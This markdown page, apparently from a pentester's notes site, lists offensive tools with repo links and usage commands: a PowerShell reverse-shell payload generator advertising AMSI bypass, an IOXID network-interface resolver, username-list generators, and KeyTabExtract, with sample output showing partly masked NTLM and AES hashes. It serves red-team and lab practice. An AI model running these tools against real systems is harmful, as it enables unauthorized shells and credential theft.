---
# the default layout is 'page'
icon: fas fa-tools
order: 5
---
## 🛠 Powershell Generator Tool
- Always Generate unique Random words in payload.
- AMSI Bypass.
- Fast & Efficient

Repo link:- [link](https://github.com/0xmrsecurity/All_Fast/blob/main/Generate-Payload/windows/Sl0t.sh)
### Usage:-
```bash
./Slot.sh --lhost 192.168.x.x --lport 9001 --sport 8000
```
## 🌐 IOXIDResolver
- Resolve all IP Address of the Machine.(Ipv4 and IPv6 Both)
- Resolve all interface Adress.
- Also Resolve the hostname

Repo link:- [link](https://github.com/mubix/IOXIDResolver/blob/main/IOXIDResolver.py)
### Usage:-
```bash
python3 IOXIDResolver.py -t  192.168.xx.xx
```
## 🌐 username-anarchy  &&  🌐 GenUser_list.sh
- Generating variation of usernames.

Repo link:- [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
### Usage:-
```bash
./username-anarchy -i users.txt  > valid-user.lst 
```
Repo link:- [GenUser_list](https://github.com/0xmrsecurity/All_Fast/blob/main/Generate-Userlist/GenUser_list.sh)
### Usage:-
```bash
./GenUser_list.sh -h 
*****************************************
*           GenUser_list.sh             *
*****************************************
Usage: ./GenUser_list.sh -i input_user.lst
```

## 🌐 KeyTabExtract
- Extract creds from keytab file.
- For Example Below

Repo link:- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py)
### Usage:-
```bash
python3 KeyTabExtract.py /path/to/krb5.keytab
```
```bash
└─# python3 KeyTabExtract.py /home/0xmr/krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : AI.LOC
        SERVICE PRINCIPAL : UUCP$/
        NTLM HASH : fa1a60293357xxxxxe99b306e406537
        AES-256 HASH : 6de7510ba5a852dc1dea141a8bda6xxxxxx25db6d04a133713feaddbbc19f6ba8
        AES-128 HASH : 5dde7468f96xxxxxfb326cb09ac28ee0
```
